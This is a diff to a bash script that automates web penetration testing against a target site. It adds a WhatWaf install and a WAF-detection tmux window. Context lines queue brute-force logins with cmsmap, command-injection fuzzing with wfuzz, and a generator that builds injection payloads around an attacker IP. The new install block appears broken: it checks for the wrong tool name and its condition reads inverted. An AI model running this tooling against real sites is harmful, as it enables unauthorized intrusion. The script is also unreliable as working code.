@@ -25,7 +25,7 @@ do
     echo ""    
     echo "Select actions on [$site]:"
     echo "1. WEAPONIZATION: install usefull tools for penetration test."
-    echo "2. EXPLOITATION: Information gathering, serviz information gathering, quick win, etc."
+    echo "2. EXPLOITATION: Information gathering, service information gathering, quick win, etc."
     echo "3. WEB APP: Site fingerprint (site structure, virtual host, etc)"
     echo "4. WEB APP: Information gathering (google dork, CMS, etc)"
     echo "5. WEB APP: AuthN bypass (brute force, command injection, webDAV, etc)"
@@ -248,6 +248,20 @@ else
 	sudo apt-get install dirsearch
 fi
 
+
+# whatwaf (WAF detection)
+echo ""
+program="whatweb"
+cd /opt
+if ! is_installed "whatweb"; then
+	echo "[i] $program is already installed."
+else
+	echo "[->] Installing $program..."	
+	sudo git clone https://github.com/Ekultek/WhatWaf.git
+	cd /opt/WhatWaf 
+	sudo pip3 install -r requirements.txt
+	sudo python setup.py install
+fi
 
 
 # Synk e copilot
@@ -629,6 +643,17 @@ tmux send-keys -t PT:7.1 "curl -s -I http://$site"
 cd $folderProject
 
 
+# WAF Detection
+cd $folderProjectWebFingerprint
+# Layout
+tmux new-window -t PT:8 -n 'WAF Detection'
+tmux split-window -v -t PT:8.0
+# Esecuzione dei comandi nelle sottofinestre
+tmux send-keys -t PT:8.0 "# WAF Detection (whatwaf)" Enter
+tmux send-keys -t PT:8.0 "sudo whatwaf -u http://$site"
+cd $folderProject
+
+
 # Attivazione della modalità interattiva
 tmux -2 attach-session -t PT
 ;;
@@ -751,7 +776,6 @@ tmux split-window -v -t PT:6.0
 tmux split-window -v -t PT:6.1
 tmux split-window -v -t PT:6.2
 tmux split-window -v -t PT:6.3
-tmux split-window -v -t PT:6.4
 tmux select-pane -t "6.0"
 tmux split-window -h -t "6.0"
 tmux split-window -h -t "6.0"
@@ -792,7 +816,6 @@ tmux send-keys -t PT:6.10 "sudo cmsmap https://$site -u ../users.txt -p ../passw
 tmux send-keys -t PT:6.11 "# scan drupal site with droopescan" Enter
 tmux send-keys -t PT:6.11 "droopescan scan drupal -u http://$site -t 32"
 cd $folderProject
-
 
 
 
@@ -883,7 +906,7 @@ tmux send-keys -t PT:3.5 "wfuzz -w /opt/SecLists/Fuzzing/special-chars.txt -H \"
 cd $folderProjectEngine
 #tmux send-keys -t PT:3.6 "echo \"eseguo da path $folderProjectEngine -> python ./cmdGenerator.py $attackerIP cmdList.txt \""
 python ./cmdGenerator.py $attackerIP cmdlist.txt
-mv "$folderProjectEngine\out-command-injection-list.txt $folderProjectWebAuthN\out-command-injection-list.txt"
+mv "$folderProjectEngine/out-command-injection-list.txt" "$folderProjectWebAuthN/out-command-injection-list.txt"
 cd $folderProjectWebAuthN
 tmux send-keys -t PT:3.6 "# command injection automation (GET)" Enter
 tmux send-keys -t PT:3.6 "wfuzz -c -z file,out-command-injection-list.txt -H \"Content-Type: application/x-www-form-urlencoded\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\" --sc=200 http://$site/?id=FUZZ"
